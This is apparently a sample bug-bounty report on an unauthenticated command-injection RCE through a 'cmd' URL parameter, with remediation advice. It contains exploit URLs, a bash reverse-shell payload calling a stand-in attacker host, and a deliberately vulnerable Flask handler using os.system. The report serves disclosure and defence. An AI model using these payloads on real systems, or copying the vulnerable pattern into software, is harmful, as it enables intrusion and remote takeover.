# üêû Remote Code Execution (RCE) Vulnerability Report

---

## üìå Title

**Unauthenticated Remote Code Execution (RCE) in `cmd` Parameter**

---

## üìù Description

A critical Remote Code Execution (RCE) vulnerability was discovered in the `cmd` parameter of the application. The input from the user is passed directly to the server-side command interpreter without validation or sanitization, allowing arbitrary system commands to be executed remotely.

---

## üß™ Vulnerable Endpoint

- **URL**: `https://vulnerable-website.com/execute?cmd=`
- **Method**: `GET`
- **Parameter**: `cmd`

---

## üö® Severity

- **CVSS Score**: 10.0 (Critical)
- **Impact**: Complete system compromise
- **Access Vector**: Remote, unauthenticated

---

## üß™ Steps to Reproduce

1. Open a browser or Burp Suite.
2. Navigate to the vulnerable endpoint:

```
https://vulnerable-website.com/execute?cmd=whoami
```

3. Observe the server's response:

```
www-data
```

4. Test further commands:

```
https://vulnerable-website.com/execute?cmd=uname+-a
```

5. Response:

```
Linux ubuntu 5.15.0-67-generic #74-Ubuntu SMP x86_64 GNU/Linux
```

‚úÖ These outputs confirm direct command execution on the server.

## üí£ Exploit Examples

### üîç Basic Command Execution

```bash
https://vulnerable-website.com/execute?cmd=whoami
```

### üìÇ List Directory

```bash
https://vulnerable-website.com/execute?cmd=ls+-la
```

### üíª Reverse Shell (Linux)

```bash
https://vulnerable-website.com/execute?cmd=bash+-c+'bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1'
```

‚ö†Ô∏è For PoC only. Do not execute on production systems.

---

## üéØ Impact

- Full server compromise
- File system access
- Credential dumping
- Lateral movement within the network
- Persistent access (backdoors)
- Sensitive data exfiltration

---

## ‚öôÔ∏è Affected Components

- Improperly handled user input in server-side command functions
- Lack of input sanitization or command restrictions
- Use of insecure APIs such as `os.system`, `exec`, `popen`, etc.

---

## üîß Example Vulnerable Code (Python)

```python
# ‚ùå Vulnerable
@app.route('/execute')
def execute():
    cmd = request.args.get('cmd')
    os.system(cmd)
```

---

## üõ°Ô∏è Recommended Remediation

- Never use user input directly in system calls.
- Use a whitelist of commands if command execution is absolutely necessary.
- Use secure alternatives like subprocess with argument lists:

```python
# ‚úÖ Secure
subprocess.run(["ls", "-la"], check=True)
```

- Implement strict input validation.
- Disable unnecessary system functionality (e.g., shell access).
- Run applications with limited OS permissions (non-root).
- Monitor for command injection attempts in logs.

---

## üîê Security Best Practices

- Use Web Application Firewalls (WAF)
- Perform regular code audits and pen testing
- Apply least privilege to web services
- Monitor outbound traffic for reverse shell activity
- Log all command execution attempts
